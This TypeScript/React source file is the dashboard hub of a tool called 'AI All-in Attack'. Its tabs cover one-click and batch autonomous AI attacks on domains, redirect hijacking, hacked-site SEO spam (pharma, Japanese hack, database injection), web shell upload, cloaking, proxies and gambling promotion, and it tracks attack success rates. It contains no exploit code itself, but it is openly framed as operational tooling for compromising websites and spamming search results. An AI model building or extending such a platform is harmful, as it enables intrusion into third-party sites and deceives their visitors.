/**
 * AI All-in Attack (AAA) — Unified Hub
 *
 * Consolidates ALL Blackhat Mode + Autonomous AI functions into a single page
 * with sub-tabs. Features quick stats overview, status indicators, and mobile-first UI.
 * The "Attack" tab is the main entry point for one-click attacks.
 */
import { Suspense, useState, lazy, useMemo } from "react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Card, CardContent } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { trpc } from "@/lib/trpc";
import {
  Loader2, Skull, Brain, Wrench, History, Cpu, Rocket, Radar, BarChart3,
  Activity, Zap, Target, Shield, Globe, TrendingUp, CheckCircle, XCircle,
  Clock, Play, Terminal, ChevronRight, Syringe, Search, Network, Sparkles,
} from "lucide-react";

// ─── Lazy-load sub-pages to keep bundle small ───
const AutonomousFriday = lazy(() => import("./AutonomousFriday"));
const AgenticAttack = lazy(() => import("./AgenticAttack"));
const BatchAttack = lazy(() => import("./BatchAttack"));
const AttackDashboard = lazy(() => import("./AttackDashboard"));
const AttackTimeline = lazy(() => import("./AttackTimeline"));
const AutonomousHistory = lazy(() => import("./AutonomousHistory"));
const DeployHistory = lazy(() => import("./DeployHistory"));
const ExploitAnalytics = lazy(() => import("./ExploitAnalytics"));
const AdaptiveLearning = lazy(() => import("./AdaptiveLearning"));
const TargetAcquisition = lazy(() => import("./TargetAcquisition"));
const MassDiscovery = lazy(() => import("./MassDiscovery"));
const KeywordDiscovery = lazy(() => import("./KeywordDiscovery"));
const QueryParasiteDashboard = lazy(() => import("./QueryParasiteDashboard"));
const PlatformDiscoveryDashboard = lazy(() => import("./PlatformDiscoveryDashboard"));
const CompetitorGapDashboard = lazy(() => import("./CompetitorGapDashboard"));
const AlgorithmMonitorDashboard = lazy(() => import("./AlgorithmMonitorDashboard"));
const ContentFreshnessDashboard = lazy(() => import("./ContentFreshnessDashboard"));
const ProxyDashboard = lazy(() => import("./ProxyDashboard"));
const CveDashboard = lazy(() => import("./CveDashboard"));
const TemplateLibrary = lazy(() => import("./TemplateLibrary"));
const ScheduledScans = lazy(() => import("./ScheduledScans"));
const RedirectTakeover = lazy(() => import("./RedirectTakeover"));
const HijackRedirect = lazy(() => import("./HijackRedirect"));
const KeywordRanking = lazy(() => import("./KeywordRanking"));
const OrchestratorDashboard = lazy(() => import("./OrchestratorDashboard"));
const AutonomousCommandCenter = lazy(() => import("./AutonomousCommandCenter"));
const GamblingBrainDashboard = lazy(() => import("./GamblingBrainDashboard"));
const KeywordPerformancePage = lazy(() => import("./KeywordPerformancePage"));
const DaemonControlCenter = lazy(() => import("./DaemonControlCenter"));
const WpThemes = lazy(() => import("./WpThemes"));
const CloakingSettings = lazy(() => import("./CloakingSettings"));
const SeoSpamMode = lazy(() => import("./SeoSpamMode"));
const SeoSpamV2Dashboard = lazy(() => import("./SeoSpamV2Dashboard"));
const HackedSeoSpamDashboard = lazy(() => import("./HackedSeoSpamDashboard"));
const ParasiteRedirectChainDashboard = lazy(() => import("./ParasiteRedirectChainDashboard"));

function TabLoader() {
  return (
    <div className="flex items-center justify-center h-[40vh]">
      <div className="flex flex-col items-center gap-3">
        <Loader2 className="w-6 h-6 text-red-400 animate-spin" />
        <p className="text-xs text-muted-foreground font-mono">Loading module...</p>
      </div>
    </div>
  );
}

// ─── Quick Stats Overview (shown at top) ───
function QuickStats() {
  const { data: overview } = trpc.attackDashboard.overview.useQuery(
    { period: "week" },
    { refetchInterval: 20000, retry: 1 }
  );

  if (!overview) return null;

  const stats = [
    {
      label: "Attacks",
      value: overview.attacks.total,
      icon: Skull,
      color: "text-red-400",
      bg: "bg-red-500/10 border-red-500/20",
    },
    {
      label: "Success",
      value: `${overview.attacks.successRate}%`,
      icon: CheckCircle,
      color: overview.attacks.successRate >= 50 ? "text-emerald-400" : "text-amber-400",
      bg: overview.attacks.successRate >= 50 ? "bg-emerald-500/10 border-emerald-500/20" : "bg-amber-500/10 border-amber-500/20",
    },
    {
      label: "Domains",
      value: overview.attacks.uniqueDomains,
      icon: Globe,
      color: "text-cyan-400",
      bg: "bg-cyan-500/10 border-cyan-500/20",
    },
    {
      label: "Redirects",
      value: overview.deploys.totalRedirects,
      icon: Activity,
      color: "text-violet-400",
      bg: "bg-violet-500/10 border-violet-500/20",
    },
    {
      label: "Running",
      value: overview.deploys.running || 0,
      icon: Play,
      color: overview.deploys.running ? "text-green-400" : "text-zinc-500",
      bg: overview.deploys.running ? "bg-green-500/10 border-green-500/20 animate-pulse" : "bg-zinc-500/10 border-zinc-500/20",
    },
  ];

  return (
    <div className="grid grid-cols-5 gap-2">
      {stats.map((s, i) => (
        <div
          key={i}
          className={`flex items-center gap-2 px-3 py-2 rounded-lg border ${s.bg} transition-all hover:scale-[1.02]`}
        >
          <s.icon className={`w-4 h-4 ${s.color} shrink-0`} />
          <div className="min-w-0">
            <p className={`text-lg font-bold ${s.color} tabular-nums leading-tight`}>{s.value}</p>
            <p className="text-[10px] text-muted-foreground uppercase tracking-wider truncate">{s.label}</p>
          </div>
        </div>
      ))}
    </div>
  );
}

// ─── Sub-tab definitions ───
interface SubTab {
  id: string;
  label: string;
  icon?: React.ElementType;
  component: React.LazyExoticComponent<React.ComponentType<any>>;
  description?: string;
}

const ATTACK_SUBTABS: SubTab[] = [
  { id: "engine", label: "AI Attack Engine", icon: Rocket, component: AutonomousFriday, description: "One-click autonomous attack pipeline" },
  { id: "agentic", label: "Agentic AI", icon: Brain, component: AgenticAttack, description: "Multi-step AI reasoning attack" },
  { id: "batch", label: "Batch Attack", icon: Zap, component: BatchAttack, description: "Multi-domain simultaneous attacks" },
  { id: "redirect", label: "Redirect Takeover", icon: Target, component: RedirectTakeover, description: "Override competitor redirects" },
  { id: "hijack", label: "Hijack Redirect", icon: Shield, component: HijackRedirect, description: "Takeover existing redirect chains" },
];

const INTEL_SUBTABS: SubTab[] = [
  { id: "target", label: "Target Acquisition", icon: Target, component: TargetAcquisition },
  { id: "mass", label: "Mass Discovery", icon: Globe, component: MassDiscovery },
  { id: "keyword-disc", label: "Keyword Discovery", icon: TrendingUp, component: KeywordDiscovery },
  { id: "query-parasite", label: "Query Parasite", component: QueryParasiteDashboard },
  { id: "platform", label: "Platform Discovery", component: PlatformDiscoveryDashboard },
  { id: "competitor", label: "Competitor Gap", component: CompetitorGapDashboard },
  { id: "algo", label: "Algo Monitor", component: AlgorithmMonitorDashboard },
  { id: "freshness", label: "Content Freshness", component: ContentFreshnessDashboard },
];

const TOOLS_SUBTABS: SubTab[] = [
  { id: "proxy", label: "Proxy Dashboard", icon: Shield, component: ProxyDashboard },
  { id: "cve", label: "CVE Database", icon: Terminal, component: CveDashboard },
  { id: "templates", label: "Templates", component: TemplateLibrary },
  { id: "cloaking", label: "Cloaking", component: CloakingSettings },
  { id: "wp-themes", label: "WP Themes", component: WpThemes },
  { id: "scheduled", label: "Scheduled Scans", icon: Clock, component: ScheduledScans },
  { id: "keyword-rank", label: "Keyword Ranking", icon: BarChart3, component: KeywordRanking },
];

const HISTORY_SUBTABS: SubTab[] = [
  { id: "dashboard", label: "Attack Dashboard", icon: BarChart3, component: AttackDashboard },
  { id: "timeline", label: "Timeline", icon: Activity, component: AttackTimeline },
  { id: "attack-hist", label: "Attack History", icon: History, component: AutonomousHistory },
  { id: "deploy", label: "Deploy History", icon: Rocket, component: DeployHistory },
  { id: "exploit", label: "Exploit Analytics", icon: TrendingUp, component: ExploitAnalytics },
  { id: "learning", label: "Adaptive Learning", icon: Brain, component: AdaptiveLearning },
];

const SEO_SPAM_SUBTABS: SubTab[] = [
  { id: "seo-v2", label: "V2 AI Engine", icon: Brain, component: SeoSpamV2Dashboard, description: "AI-Powered SEO Spam — Content Gen + Keywords + Link Wheel + Evasion" },
  { id: "hacked-seo", label: "Hacked SEO", icon: Skull, component: HackedSeoSpamDashboard, description: "Hacked SEO Spam — Japanese Hack + Pharma + Doorway + Cloaking + DB Injection" },
  { id: "parasite-chain", label: "Parasite Chain", icon: Network, component: ParasiteRedirectChainDashboard, description: "Parasite Redirect Chain — Domain → Short URL → Target (middlemanbar style)" },
  { id: "seo-v1", label: "V1 Classic", icon: Syringe, component: SeoSpamMode, description: "Classic SEO Spam — Payload gen, shell upload, obfuscation" },
];

const AUTO_SUBTABS: SubTab[] = [
  { id: "orchestrator", label: "Orchestrator", icon: Cpu, component: OrchestratorDashboard },
  { id: "command", label: "AI Command Center", icon: Terminal, component: AutonomousCommandCenter },
  { id: "gambling", label: "Gambling AI Brain", icon: Brain, component: GamblingBrainDashboard },
  { id: "kw-perf", label: "Keyword Performance", icon: TrendingUp, component: KeywordPerformancePage },
  { id: "daemon", label: "Daemon Control", icon: Cpu, component: DaemonControlCenter },
];

// ─── Improved SubTabPanel with icons and descriptions ───
function SubTabPanel({ subtabs, defaultTab }: { subtabs: SubTab[]; defaultTab?: string }) {
  const [activeSubTab, setActiveSubTab] = useState(defaultTab || subtabs[0]?.id || "");

  const ActiveComponent = subtabs.find(t => t.id === activeSubTab)?.component;
  const activeTab = subtabs.find(t => t.id === activeSubTab);

  return (
    <div className="space-y-4">
      {/* Sub-tab navigation — scrollable on mobile */}
      <div className="overflow-x-auto -mx-2 px-2 pb-1">
        <div className="flex gap-2 min-w-max">
          {subtabs.map(tab => {
            const isActive = activeSubTab === tab.id;
            const Icon = tab.icon;
            return (
              <button
                key={tab.id}
                onClick={() => setActiveSubTab(tab.id)}
                className={`flex items-center gap-1.5 px-3 py-2 rounded-lg text-xs font-medium transition-all duration-200 whitespace-nowrap ${
                  isActive
                    ? "bg-red-500/15 text-red-400 border border-red-500/30 shadow-sm shadow-red-500/10"
                    : "bg-muted/40 text-muted-foreground hover:text-foreground hover:bg-muted/80 border border-transparent"
                }`}
              >
                {Icon && <Icon className={`w-3.5 h-3.5 ${isActive ? "text-red-400" : ""}`} />}
                {tab.label}
              </button>
            );
          })}
        </div>
      </div>

      {/* Active tab description */}
      {activeTab?.description && (
        <p className="text-xs text-muted-foreground flex items-center gap-1">
          <ChevronRight className="w-3 h-3" />
          {activeTab.description}
        </p>
      )}

      {/* Content */}
      <Suspense fallback={<TabLoader />}>
        {ActiveComponent && <ActiveComponent />}
      </Suspense>
    </div>
  );
}

// ─── Main Tab Configuration ───
const MAIN_TABS = [
  {
    id: "attack",
    label: "Attack",
    icon: Rocket,
    color: "data-[state=active]:bg-red-500/15 data-[state=active]:text-red-400 data-[state=active]:shadow-red-500/10",
    subtabs: ATTACK_SUBTABS,
    defaultSubTab: "engine",
  },
  {
    id: "intel",
    label: "Intelligence",
    icon: Radar,
    color: "data-[state=active]:bg-amber-500/15 data-[state=active]:text-amber-400 data-[state=active]:shadow-amber-500/10",
    subtabs: INTEL_SUBTABS,
  },
  {
    id: "tools",
    label: "Tools",
    icon: Wrench,
    color: "data-[state=active]:bg-emerald-500/15 data-[state=active]:text-emerald-400 data-[state=active]:shadow-emerald-500/10",
    subtabs: TOOLS_SUBTABS,
  },
  {
    id: "history",
    label: "History",
    icon: History,
    color: "data-[state=active]:bg-violet-500/15 data-[state=active]:text-violet-400 data-[state=active]:shadow-violet-500/10",
    subtabs: HISTORY_SUBTABS,
    defaultSubTab: "dashboard",
  },
  {
    id: "seo-spam",
    label: "SEO Spam",
    icon: Sparkles,
    color: "data-[state=active]:bg-fuchsia-500/15 data-[state=active]:text-fuchsia-400 data-[state=active]:shadow-fuchsia-500/10",
    subtabs: SEO_SPAM_SUBTABS,
    defaultSubTab: "seo-v2",
  },
  {
    id: "auto",
    label: "Autonomous",
    icon: Cpu,
    color: "data-[state=active]:bg-cyan-500/15 data-[state=active]:text-cyan-400 data-[state=active]:shadow-cyan-500/10",
    subtabs: AUTO_SUBTABS,
  },
];

export default function AAAHub() {
  const [mainTab, setMainTab] = useState("attack");

  const currentMainTab = MAIN_TABS.find(t => t.id === mainTab);

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-start justify-between flex-wrap gap-3">
        <div className="flex items-center gap-3">
          <div className="w-11 h-11 rounded-xl bg-gradient-to-br from-red-500/20 to-red-600/10 border border-red-500/30 flex items-center justify-center shadow-lg shadow-red-500/5">
            <Skull className="w-6 h-6 text-red-400" />
          </div>
          <div>
            <h1 className="text-xl font-bold tracking-tight flex items-center gap-2">
              AI All-in Attack
              <Badge variant="outline" className="text-[10px] font-mono bg-red-500/10 text-red-400 border-red-500/30">
                AAA v2
              </Badge>
            </h1>
            <p className="text-xs text-muted-foreground font-mono">
              Unified attack command center — all weapons, one interface
            </p>
          </div>
        </div>
        {/* Live status */}
        <div className="flex items-center gap-2">
          <div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
          <span className="text-xs text-emerald-400 font-mono">SYSTEM ONLINE</span>
        </div>
      </div>

      {/* Quick Stats Overview */}
      <QuickStats />

      {/* Main Tabs */}
      <Tabs value={mainTab} onValueChange={setMainTab}>
        <TabsList className="bg-muted/30 border border-border/50 p-1 h-auto flex-wrap gap-1">
          {MAIN_TABS.map(tab => (
            <TabsTrigger
              key={tab.id}
              value={tab.id}
              className={`gap-1.5 ${tab.color} data-[state=active]:shadow-sm transition-all`}
            >
              <tab.icon className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">{tab.label}</span>
              <span className="sm:hidden text-xs">{tab.label.slice(0, 3)}</span>
            </TabsTrigger>
          ))}
        </TabsList>

        {MAIN_TABS.map(tab => (
          <TabsContent key={tab.id} value={tab.id} className="mt-4">
            <SubTabPanel subtabs={tab.subtabs} defaultTab={tab.defaultSubTab} />
          </TabsContent>
        ))}
      </Tabs>
    </div>
  );
}
